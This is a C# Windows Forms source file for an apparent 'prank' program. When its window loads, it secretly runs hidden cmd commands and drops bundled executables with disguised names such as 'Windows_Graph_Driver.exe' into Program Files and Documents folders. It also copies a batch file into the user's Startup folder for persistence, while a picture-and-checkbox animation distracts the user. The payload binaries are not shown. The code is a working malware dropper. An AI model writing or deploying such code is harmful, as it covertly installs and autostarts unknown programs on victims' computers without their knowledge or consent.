using Prikolnaya.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Prikolnaya
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

        }
        void Cmd (string line)
        {
            Process.Start(new ProcessStartInfo { FileName = "cmd", Arguments = $"/c {line}", WindowStyle = ProcessWindowStyle.Hidden });
        }
        string pathPF = $"\"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)}\\Windows Doppler Drives\"";
        string pathDocs = $"\"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\WindDopp\\\"";

        async void helloworld()
        {
            await Task.Run(() =>
                {

                    //создать папки
                    Cmd($"c: & mkdir {pathPF} & mkdir {pathDocs}");
                    //новые пути
                    pathPF = $"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)}\\Windows Doppler Drives\\";
                    pathDocs = $"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\WindDopp\\";
                Again:
                    try
                    {
                        do
                        {
                            //файлы раскидать
                            File.WriteAllBytes(pathPF + "SkibidiDop.exe", Resources.SkibidiDop);
                            File.WriteAllBytes(pathPF + "Windows_Graph_Driver.exe", Resources.Windows_Graph_Driver);

                            File.WriteAllBytes(pathDocs + "SkibidiDop.exe", Resources.SkibidiDop);
                            File.WriteAllBytes(pathDocs + "Windows_Graph_Driver.exe", Resources.Windows_Graph_Driver);
                            File.WriteAllBytes(pathDocs + "MadeAndCancel.exe", Resources.MadeAndCancel);
                            File.WriteAllText(pathDocs + "Skibidi.bat", Resources.Skibidi);
                            //автозагрузка
                            Cmd($"c: & cd \"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}/WindDopp/\" & copy Skibidi.bat \"%appdata%/Microsoft/Windows/Start Menu/Programs/Startup\" ");
                        }
                        while (!File.Exists(pathPF + "Windows_Graph_Driver.exe")
                  && !File.Exists(pathPF + "SkibidiDop.exe") && !File.Exists(pathDocs + "Windows_Graph_Driver.exe")
                  && !File.Exists(pathDocs + "MadeAndCancel.exe") && !File.Exists(pathDocs + "SkibidiDop.exe")
                  && !File.Exists(pathDocs + "Skibidi.bat"));
                    }
                    catch { goto Again; }
                   
                });
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            helloworld();
            pictureBox1.MouseEnter += async (a, ss) => { pictureBox1.Image = Resources._2; foreach (CheckBox checkBox in Controls.OfType<CheckBox>()) { checkBox.Visible = true; await Task.Delay(10);  checkBox.Checked = true; await Task.Delay(40); } };
            pictureBox1.MouseLeave += async (a, ss) => { pictureBox1.Image = Resources._1; foreach (CheckBox checkBox in Controls.OfType<CheckBox>()) { checkBox.Checked = false; await Task.Delay(10);  checkBox.Visible = false;  await Task.Delay(40); } };
            //MessageBox.Show("All Done.");
        }
    }
}
